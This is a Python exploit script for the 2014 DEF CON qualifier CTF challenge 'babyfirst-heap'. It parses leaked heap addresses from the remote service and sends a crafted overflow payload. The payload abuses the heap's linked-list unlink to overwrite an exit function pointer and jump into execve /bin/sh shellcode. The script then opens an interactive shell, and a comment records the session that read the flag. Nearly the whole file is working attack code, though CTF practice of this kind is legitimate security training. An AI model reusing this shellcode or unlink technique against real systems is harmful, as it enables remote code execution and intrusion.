__author__ = 'HuyNA'

'''
Baby's First: 1 points

heap

Heap feng shui not required: http://services.2014.shallweplayaga.me/babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c :
babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c.2014.shallweplayaga.me 4088
'''
import sys
import os
import socket
import time
import telnetlib
import struct

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#184.175.99.226 9090
host = "babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c.2014.shallweplayaga.me"
local_host="192.168.248.177"
port = 4088
s.connect((host, port))
#s.connect((local_host, 2323))
sys.stdin.read(1)
data = recv_until(s,'Write to object [size=260]:\n')
line = data.split('\n')
for i in line:
    print i
alloc_address = []
count = 0
for i in range(7,27):
    alloc_address.append(int(line[i][12:19],16))
    print count, '\t', hex(alloc_address[count]), '\t', alloc_address[count]
    count+=1

#[ALLOC][loc=83AE350][size=260]
#[ALLOC][loc=83AE458][size=877]

address_begin_shell = struct.pack("<I",alloc_address[10]+8)
address_begin_shell1 = struct.pack("<I",alloc_address[10]+108)
do_exit_function = struct.pack('<I',0x0804C8AC-4)
shellcode  = '\x90'*7+'\x68\x2f\x2f\x73\x68'+'\x31\xd2\x31\xc9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
print len(shellcode)
shell1 = shellcode + '\x90'*(100-len(shellcode))
shell2 = address_begin_shell + do_exit_function + shell1 + address_begin_shell * 15 + do_exit_function *10
shell = shell2 + 'a'*(0x100-len(shell2)) + '\x00'*4 + '\x78\x03\x00\x00' + address_begin_shell + do_exit_function + 0x98*'b' + ('\x00'*4+'\xe9\x04\x00\x00'+address_begin_shell+do_exit_function)*7 + 'a'*(0x368-0x108)
shell += '\x00'*4 + '\xe9\x04\x00\x00' + address_begin_shell + do_exit_function + 100*'c'

#print data
time.sleep(0.01)
a = shell+'\n'
s.send(a)
time.sleep(0.01)

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.send('ls\n')
time.sleep(0.01)
print s.recv(2014)
print s.recv(2014)
print s.recv(2014)
print s.recv(2014)
print s.recv(2014)

'''
time.sleep(0.01)
print s.recv(1024)
time.sleep(0.01)
print s.recv(1024)
time.sleep(0.01)
print s.recv(1024)
time.sleep(0.01)
print s.recv(1024)
time.sleep(0.01)
print s.recv(1024)
time.sleep(0.01)

b *0x08048B1D

0x8197458
0x819755c
cd home
ls
babyfirst-heap
ubuntu
cd babyfirst-heap
ls
babyfirst-heap
flag
cat flag
The flag is: Good job on that doubly linked list. Why don't you try something harder!!OMG!!

'''
print recv_until(s,'Exiting\n')